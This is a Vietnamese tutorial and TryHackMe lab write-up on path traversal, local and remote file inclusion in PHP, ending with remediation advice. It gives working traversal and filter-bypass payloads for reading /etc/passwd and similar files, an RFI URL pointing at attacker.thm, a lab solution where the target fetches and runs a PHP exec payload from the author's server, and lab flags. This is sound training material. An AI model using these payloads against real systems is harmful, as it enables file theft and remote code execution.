# Local file inclusion - remote file inclusion - path travesal

## 1. What is file inclusion?

Trong 1 số trường hợp, ứng dụng web được ta tạo ra cho phép ta truy cập các tệp nhất định trong hệ thống, bao gồm hình ảnh, văn bản tĩnh ,... thông qua 
các param, các param này là chuỗi truy vấn được truyền trên url có thể được sử dụng để truy xuất dữ liệu, hoặc thực hiện các hành động dựa trên đầu vào
của người dùng. 

File inclusion vul cho phép kẻ tấn công có thể xem các tệp trên máy chủ từ xa mà không cần nhìn thấy hoặc có thể thực thi các mã vào một mục tiêu bất kì trên 
trang web. File inclusion vuls thường được tìm thấy và khai thác trong các ngôn ngữ lập trình khác nhau cho các ứng dụng web, chẳng hạn như là php
được tạo và triển khai kém. Vấn đề chính ở đây là các xác thực đầu vào thường quá tin tưởng người dùng, vì vậy mà kẻ tấn công có thể kiểm soát chúng và thực hiệnm các hành vi xâm phạm. Chẳng hạn cụ thể như lập trình viên sử dụng các lệnh include, require, include_once, require_once, ... các lệnh này cho phép việc file hiện tại có thể gọi ra một file khác.

_ Dấu hiệu để nhận biết trang web có thể tấn công file inclusion là đường link thường có dạng php?page hoặc php?file=...., ngoài ra việc các thông tin nhạy cảm
của trang web bị tiết lộ.

## 2. Các kiểu tấn công

#### 2.1: Path Traversal

_ Hay còn được biết đến với tên Directory traversal, đây là 1 lỗ hổng bảo mật cho phép kẻ tấn công đọc được tài nguyện hệ thống, như các file local trên máy chủ 
đang chạy ứng dụng. Kẻ tấn công có thể khai thác lỗ hổng này bằng cách thao túng và lạm dụng url của ứng dụng web để định vị và truy cập các tệp hoặc thư mục
được lưu trữ bên ngoài thư mục gốc của ứng dụng.

__ Lỗ hổng này xủa ra khi đầu vào của người dùng được chuyển đến một hàm chẳng hạn như file_get_contents trong php. Điều quan trọng ta cần nhớ ở đây là đây không phải
nguyên nhân chính gây ra lỗ hổng web, mà là do việc xác thực hoặc lọc đầu vào kém là nguyên nhân chính gây ra lỗ hổng.
Trong php, ta có thể dùng file_get_contents để đọc nội dung của tệp cho phép ta đọc nội dung của 1 tệp hoặc 1 url và trả về cho ta kết quả dưới dạng chuỗi, cái này cũng khá
hay và được ứng dụng trong bài lab mà mình sẽ demo sau.

__ Biểu đồ sau đây cho ta thấy cách ứng dụng web lưu trữ tệp trong /var/www/app:

![image](https://user-images.githubusercontent.com/104350480/222916522-91a64f03-957e-41dd-850f-bda8833380a5.png)

Như biểu đồ trên vốn dĩ yêu cầu của người dùng sẽ phải là nội dung của userCV.pdf từ một đường dẫn đã được xác định sẵn là /var/www/app/CVs. Nhưng ở đây, kẻ
tấn công có thể lợi dụng điều này và tấn công path traversal, cũng được gọi với cái tên khác là tấn công dot-dot-slash, lợi dụng việc di chuyển thư mục 
bằng cách sử dụng ../ , nếu kẻ tấn công có thể tìm thấy điểm vào như trong trường hợp này là **get.php?file=** thì kẻ tấn công có thể gửi nội dung vào đó
như sau, **http://webapp.thm/get.php?file=../../.. /../etc/passwd**

Lỗi ở đây chính là không có xác thực đầu vào và không có biện pháp để ngăn chặn, và thay vì đáng ra phải truy cập vào /var/www/app/CVs thì kẻ tấn công đã
có thể truy xuất tệp từ các thư mục khác cụ thể ở đây là /etc/passwd. Mỗi .. di chuyển thư mục cho đến khi nó đến thư mục gốc /. Sau đó nó thay đổi thư mục
thành /etc và từ đó đọc tệp /passwd.

![image](https://user-images.githubusercontent.com/104350480/222917049-4aff73fb-6c9f-49b2-acbc-ed2829ec018a.png)

Do đó ứng dụng ở đây sẽ gửi lại nội dung tệp cho người dùng:

![image](https://user-images.githubusercontent.com/104350480/222917098-4b8f42ca-aa8d-4762-96f7-4fe57f308ffa.png)

Tương tự nếu ứng dụng web chạy trên máy chủ windows, kẻ tấn công có thể cung cấp đường dẫn windows. Ví dụ kẻ tấn công muốn đọc tệp boot.ini nằm trong C:\boot.ini
thì kẻ tấn công có thể thử một vài cách sau đây: 

```
http://webapp.thm/get.php?file=../../../../boot.ini 

http://webapp.thm/get.php?file=../../../../windows/win.ini

```
Điều này cũng tương tự với hệ điều hành linux.

Đôi khi, dev sẽ filter 1 số truy cập chỉ với 1 số file hoặc thư mục nhất đinh, dưới đây là 1 số file phổ biến ta có thể tham khảo:
- /etc/passwd: có tất cả người dùng đã đăng kí có quyền truy cập vào hệ thống.
- /etc/shadow: chứa thông tin về mật khẩu của người dùng trong hệ thống.
- /root/.bash_history: chứa các lệnh đã được thực thi của root
- /proc/version: chứa thông tin về phiên bản kernel của hệ thống

___ 
What function causes path traversal vulnerabilities in PHP?  file_get_contents
___


#### 2.2 Local file inclusion

__ Local file inclusion (lfi) là một kĩ thuật đọc file trong hệ thống, lỗi này xảy ra thường sẽ khiến website bị lộ các thông tin nhạy cảm, như là passwd,
php.ini, access_log,config.php,.... lỗi này xảy ra thường do dev thiếu kiến thức về bảo mật. Như với php, việc sử dụng các chức năng như include, require, 
include_once, require_once, .. thường khiến ứng dụng dễ bị tấn công. Chúng ta sẽ làm quen với lỗ hổng này bằng ngôn ngữ php trước, mấy ngôn ngữ khác thì thôi
để sau vậy. Khai thác lfi thì nó tuân theo các khái niệm mà đã được đề cập ở path travesal đã nói ở phần trước.

Giả sử ứng dụng web cung cấp hai ngôn ngữ và người dùng có thể chọn giữa EN và VN:

![image](https://user-images.githubusercontent.com/104350480/222918152-0322c108-1f73-48c4-b851-7a06239343e8.png)

Code php ở trên sử dụng yêu cầu GET thông qua tham số url lang để đọc và thực thi tệp của trang bằng include, cuộc tấn công có thể được gửi bằng các yêu cầu
http như sau: http://webapp.thm/index.php?lang=EN.php để tải trang tiếng anh hoặc http://webapp.thm/index.php?lang=VN.php để tải trang tiếng việt, trong đó
các tệp EN.php và VN.php tồn tại trong cùng 1 thư mục.

Về mặt lí thuyết thì ta có thể truy cập và hiển thị bất kì file nào trên máy chủ từ đoạn code ở trên nếu không có xác thực đầu vào. Giả sử ta muốn đọc tệp
/etc/passwd chứa thông tin nhạy cảm về người dùng trên hđh linux, chúng ta có thể sử dụng cách sau: **http://webapp.thm/get.php?file=/etc/passwd**

__ Tiếp theo, trong đoạn mã sau, dev đã chỉ định thư mục bên trong hàm include: 

![image](https://user-images.githubusercontent.com/104350480/222918508-97956f07-742b-45c4-9ce0-42daa52c040b.png)

Tức nếu ta truyền như trên thì sẽ không có hiệu quả, vì nó đã được chỉ định trong thư mục languages chỉ thông qua tham số lang.

Nếu không có xác thực đầu vào thì cách trên cũng không có hiệu quả lắm vì ta hoàn toàn có thể áp dụng path traversal ở trên để tấn công, chẳng hạn, đường
dẫn bây giờ sẽ trở thành ../../../../etc/passwd

__ Trong 2 trường hợp đầu thì ta có source code nên ta có thể khai thác nó luôn. Còn tiếp theo ta sẽ đến với việc thực hiện kiểm tra black box testing, khi 
không có source code, bắt đầu với trường hợp lỗi trả về trực tiếp trên trang web khi ta thực hiện truy vấn sai, chẳng hạn nhập 'THM' chẳng hạn, sẽ có lỗi
trả về như sau: 

![image](https://user-images.githubusercontent.com/104350480/222918822-69af4395-32f1-481b-b97b-17523a73ffd9.png)


Thông báo lỗi đã tiết lộ thông tin quan trọng. Bằng cách nhập THM làm đầu vào hay bất cứ cái gì khác mà kh phải là EN hay VN thì nó đã trả về lỗi cho ta là
nó đang được thực hiện trong hàm include với thư mục được chỉ định như ví dụ trước:  include(languages/THM.php) với đường dẫn đầy đủ đang là
/var/www/html/THM-4/ . Để khai thác thì vẫn như ví dụ trước thôi: ../../../../etc/passwd

Nhưng khi áp dụng đường dẫn trên ta vẫn nhận được lỗi: 

![image](https://user-images.githubusercontent.com/104350480/222919069-3f5d895a-868a-4cc3-bba7-8e4f33050451.png)

Rõ ràng thì chức năng include đã thực thi việc thêm .php ở cuối file thành /passwd.php, vì vậy nó trả về lỗi sai, để bypass thì ta có thể sử dụng NULL byte,
tức có thể thêm vào cuối như %00 hoặc 0x00 ở dạng hex với dữ liệu do người dùng cung cấp để kết thúc chuỗi. Ứng dụng web sẽ bỏ qua bất kì thứ gì xuất hiện
sau NULL byte mà cụ thể ở đây là .php:
include("languages/../../../../../etc/passwd%00").".php"); sẽ tương đương với: include("languages/../../../../../etc/passwd");

__ Tuy nhiên thì trick này sẽ chỉ được sử dụng với các phiên bản php dưới 5.3.4, tức là biết cho vui thôi :))

Chẳng hạn áp dụng cho lab3 trên tryhackme: ta dùng đường dẫn: **/lab3.php?file=../../../../etc/passwd%00** để giải quyết sau khi đã thấy lỗi trả về:

![image](https://user-images.githubusercontent.com/104350480/222919561-4dd1cda9-90dc-4d2e-a8d8-c009b4340be7.png)

__ Kĩ thuật này cũng sử dụng tương tự được ở lab4 khi mà dev quyết định filter /etc/passwd, thì kĩ thuật null byte cũng là 1 cách có thể áp dụng được,
ngoài ra ta có thể áp dụng thêm kĩ thuật nữa ở đây là dùng 1 lệnh vô nghĩa : cd . , tức chỉ định thư mục hiện tại để bypass, mình cũng đếch hiểu lm nhưng mà
nó dùng như thế này: thay vì truyền null byte vào cuối để bypass thì ta truyền: /etc/passwd/. để bypass.

__ Tiếp theo, thì là một lỗi nữa là dev có filter ../ nhưng mà filter kh đệ quy nên ta có thể bypass để thực hiện lab5:

![image](https://user-images.githubusercontent.com/104350480/222920047-e8b1bd91-93f5-449c-9255-7b28623cc976.png)


Bằng cách truyền: /lab5.php?file=....//....//....//....//etc/passwd


__ Cuối cùng ở phần này ta sẽ thảo luận về việc trường hợp dev buộc phần include phải bao gồm 1 vị trí đã định sẵn như:
**http://webapp.thm/index.php?lang=languages/EN.php** , thì để khai thác điều này chúng ta cần include thư mục như sau: 
?lang=languages/../../../../../etc/passwd .
Chẳng hạn như trong bài lab6 là: THM-profile/../../../../../etc/passwd

![image](https://user-images.githubusercontent.com/104350480/222920847-08c21cc5-c96d-4259-8e87-609af80474a5.png)

## 2.3: Remote file inclusion - RFI

__ Remtoe file inclusion là 1 kĩ thuật đọc và thực thi file từ xa (thông thường qua include). Giống như LFI, RFI xảy ra khi xác thực hay lọc đầu vào kh đúng
cách, nhưng nguy hiểm hơn nhiều, cho phép kẻ tấn công đưa 1 url bên ngoài vào chức năng include. Một yêu cầu với RFI là option **allow_url_fopen** cần được bật.

__ Rủi ro của rfi rõ ràng là cao hơn nhiều so với lfi, nó cho phép kẻ tấn công giành được thực thi lệnh từ xa trên máy chủ, các hậu quả của rfi bao gồm:
- Tiết lộ thông tin nhạy cảm.
- xss
- Denial of service(dos)

__ Máy chủ bên ngoài phải liên lạc được máy chủ ứng dụng để tấn công LFI thành công, nơi kẻ tấn công lưu trữ các tệp độc hại trên máy chủ của họ. Sau đó, tệp
độc hại này được đưa vào hàm include thông qua các yêu cầu http và lệnh include này sẽ đọc và thực thi các lệnh trên tệp độc hại truyền vào:
Cụ thể sơ đồ sẽ như sau: 

![image](https://user-images.githubusercontent.com/104350480/222921193-b10794cb-61f6-4f0a-b51f-24e875d7a848.png)

__ Các bước tấn công rfi trong mô hình trên diễn ra như sau: 

Chẳng hạn, kẻ tấn công lưu trữ file cmd.txt trong đó cmd.txt chứa thông báo 'Hello THM' 

![image](https://user-images.githubusercontent.com/104350480/222921520-65bf6a4b-7823-43fd-beca-c0a8a0c5988c.png)


Đầu tiên kẻ tấn công tiêm url độc hại trỏ đến máy chủ để tấn công, chẳng hạn như: **http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt**, nếu không
có xác thực đầu vào thì url độc hại sẽ chuyển qua hàm include. Tiếp theo, máy chủ ứng dụng web sẽ gửi yêu cầu GET đến máy chủ độc hại để nạp file. Do đó tùy
vào nội dung file thì nó sẽ thực thi lệnh php trng file và như ở đây trang web sẽ hiển thị 'Hello THM', tất nhiên là trong thực tế nếu rce được thì ta sẽ
dùng các lệnh nguy hiểm hơn nhiều. Có lẽ tí sẽ demo bằng các bài lab hay hơn thì sẽ dễ hiểu hơn.

## 3. Lab test kiến thức tryhackme

Trước khi thực hiện bài lab, ta cần biết 1 vài bước thực hiện để test lfi:
1. Tìm entry point có thể thông qua như get,post,cookie hoặc http.
2. Nhập thông tin đầu vào hợp lệ để xem máy chủ web hoạt động như thế nào.
3. Nhập đầu vào không hợp lệ, bao gồm các kí tự đặc biệt và các file phổ biến.
4. Đôi khi ta có thể tấn công mà kh biết, nên dùng thêm 1 số công cụ như burp suite để hỗ trợ.
5. Tìm lỗi trong input đầu vào không hợp lệ như đường dẫn hiện tại của ứng dụng, nếu kh có lỗi thì ta ngồi mò vài lần xem sao, chẳng may đúng thì ngon luôn.
6. Hiểu được các xác thực đầu vào, chẳng hạn như ứng dụng web filter cái gì thì ta có thể dựa vào đó để bypass.
7. Rồi được ròi thì tiêm thôi.

__

Lab1: Include a file in the input form below
__

![image](https://user-images.githubusercontent.com/104350480/222922699-adc84bd6-0b60-4583-8bc3-c5bbd7fd4687.png)

Có vẻ nó đang yêu cầu ta chuyển về giao thức POST, vậy sửa lại method:

![image](https://user-images.githubusercontent.com/104350480/222952864-5f919e5a-b311-43c0-9cfe-a0f209b1219d.png)

Nhìn lỗi trả về, đơn giản ta chỉ cần thực hiện: 

![image](https://user-images.githubusercontent.com/104350480/222952895-92d8dc65-e9c4-41e2-b8db-a89f47812c66.png)

> flag: F1x3d-iNpu7-f0rrn


__

Lab2: Include a file in the input form below
__

Refresh page và bắt burp suite ta được:

![image](https://user-images.githubusercontent.com/104350480/222952951-08462668-9e61-44ab-95b9-c8cd587081be.png)

Sửa cookie thành admin:

![image](https://user-images.githubusercontent.com/104350480/222952965-3fbc99b8-e218-43f0-aa1f-65ad4665e10b.png)

Có vẻ như cookie có thể khai thác được:

![image](https://user-images.githubusercontent.com/104350480/222953004-30a4d266-a9d5-4dd9-a0cd-e679a37c31e3.png)

Thêm %00 ở cuối để bypass .php:

![image](https://user-images.githubusercontent.com/104350480/222953060-f2d12ae5-ec36-4141-bf10-aef64b1010f1.png)

> flag: c00k13_i5_yuMmy1

__

Lab3: Include a file in the input form below
__

Bài này thì dựa vào hint thôi, chứ thử ở biến GET mãi nó filter bằng hết rồi, thì web đang sử dụng $_REQUESTS_ , Biến $_REQUEST_ được sử dụng để truy cập thông tin về các biến được gửi đến server bằng cả hai phương thức GET và POST, ta có thể tận dụng bằng cách đổi method:

![image](https://user-images.githubusercontent.com/104350480/222953294-a305c90e-e40b-4ece-96aa-90fc3f6065ac.png)

> flag: P0st_1s_w0rk1in9

__

Lab #Playground: Include a file in the input form below
__

Bài này là bài lab của remote file inclusion, thực ra thì ý tưởng rất đơn giản ta chỉ cần dựng local, post file lên rồi truy cho máy chủ get file của ta 
rồi thực thi lệnh 'hostname' ở đây là được. Vừa vào test /etc/passwd thì nó hiện luôn, hàm dính lỗi lfi ở include, ta dựa vào để rce, truyền vào 1 đường dẫn
để thực thi.

Tạo ở server file test.txt với nội dung: <?php print exec('hostname'); ?> để in ra hostname

Dựng local với code bên dưới, để port 8000, có cái là có thể dựng nhanh bằng python3 -m http.server 8000, nhưng lúc thì nó cho thực hiện phương thức POST
lúc thì không nên là cũng dựng thế này cho chắc.

```
import http.server
import socketserver

PORT = 8000

class MyRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)

        # save the post_data to a file
        with open('uploaded_file.txt', 'wb') as f:
            f.write(post_data)

        # send a response to the client
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'File uploaded successfully')

handler = MyRequestHandler

with socketserver.TCPServer(("", PORT), handler) as httpd:
    print("serving at port", PORT)
    httpd.serve_forever()

```

Sau đấy dùng curl -X POST -d 'test.txt' **http://127.0.0.1:8000/test.txt** để post file lên server.

![image](https://user-images.githubusercontent.com/104350480/222952526-76c5cb14-d1cf-40b5-b40b-32050d1fc344.png)

Có 1 vấn đề là bình thường thì ta sẽ dựng ngrok để giúp kết nối từ máy chủ của tryhackme thực hiện get về server mình, nhưng mà thử mãi kh có phản hồi, 
thì có vẻ như tryhackme kh cho kết nối bên ngoài như vậy, ở đây phải dùng địa chỉ IP của interface tun0 mà được tạo ra bởi kết nối vpn với tryhackme thì mới
được. Thực ra thì cũng như nhau mà tryhackme không cho phép ngrok thì đành vậy.

Thực hiện đường dẫn truyền vào param file ta được: **http://10.8.84.31 :8000/test.txt**

![image](https://user-images.githubusercontent.com/104350480/222952764-fc3b8d27-938a-4356-b215-ae99b98b7326.png)

> flag: lfi-vm-thm-f8c5b1a78692


## 4. Cách khắc phục

Là 1 nhà phát triển ứng dụng, ta cần phải có nhận thức về các lỗ hổng web, cách tìm ra chúng và có phương pháp phòng ngừa. Để ngăn chặn lỗ hổng file inclusion, một số đề xuất như là:

1. Luôn cập nhập phiên bản, hệ thống và dịch vụ, bao gồm các khung ứng dụng web với phiên bản mới nhất.
2. Ẩn đi các hiển thị lỗi php để tránh hiển thị đường dẫn của ứng dụng và các thông tin có khả năng tiết lộ khác.
3. Web Application Firewall (WAF)  là 1 lựa chọn tốt để giúp giảm thiểu các cuộc tấn công ứng dụng web.
4. Vô hiệu hóa 1 số tính năng php gây ra lỗ hổng file inclusion nếu ứng dụng kh cần chúng như allow_url_fopen và allow_url_include.
5. Không tin tưởng đầu vào vì vậy cần lọc và triển khai xác thực đầu vào thích hợp đối với các tệp được đưa vào.
6.  Thực hiện blacklist và cả whitelist đầu vào.

## 5. Các kiến thức tìm hiểu thêm được từ các bài lab.


